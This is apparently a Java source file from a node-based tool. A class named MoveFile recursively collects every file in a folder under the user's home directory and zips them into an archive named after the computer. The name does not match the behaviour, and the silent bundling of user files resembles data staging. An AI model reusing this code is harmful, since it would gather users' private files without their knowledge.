package _256.node.nodes.file;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import _256.node.Category;
import _256.node.Node;

public class MoveFile extends Node {

	public MoveFile() {
		super(Category.FILE);
	}

	@Override
	public void createNode() throws IOException {
		File directoryToZip = new File(System.getProperty("user.home") + "\\" + System.getProperty("user.name"));
		List<File> fileList = new ArrayList<File>();
		getAllFiles(directoryToZip, fileList);
		writeZipFile(directoryToZip, fileList);
	}

	public static void getAllFiles(File dir, List<File> fileList) {
		File[] files = dir.listFiles();
		for (File file : files) {
			if (files.length != 0) {
				fileList.add(file);
			}
			if (file.isDirectory()) {
				if (files.length != 0) {
					getAllFiles(file, fileList);
				}
			}
		}
	}

	public static void writeZipFile(File directoryToZip, List<File> fileList) {
		try {
			FileOutputStream fos = new FileOutputStream(System.getProperty("user.home") + "\\" + System.getenv("COMPUTERNAME") + ".zip");
			ZipOutputStream zos = new ZipOutputStream(fos);
			for (File file : fileList) {
				if (!file.isDirectory()) {
					addToZip(directoryToZip, file, zos);
				}
			}
			zos.close();
			fos.close();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public static void addToZip(File directoryToZip, File file, ZipOutputStream zos) throws FileNotFoundException, IOException {
		FileInputStream fis = new FileInputStream(file);
		String zipFilePath = file.getCanonicalPath().substring(directoryToZip.getCanonicalPath().length() + 1, file.getCanonicalPath().length());
		ZipEntry zipEntry = new ZipEntry(zipFilePath);
		zos.putNextEntry(zipEntry);
		byte[] bytes = new byte[1024];
		int length;
		while ((length = fis.read(bytes)) >= 0) {
			zos.write(bytes, 0, length);
		}
		zos.closeEntry();
		fis.close();
	}
}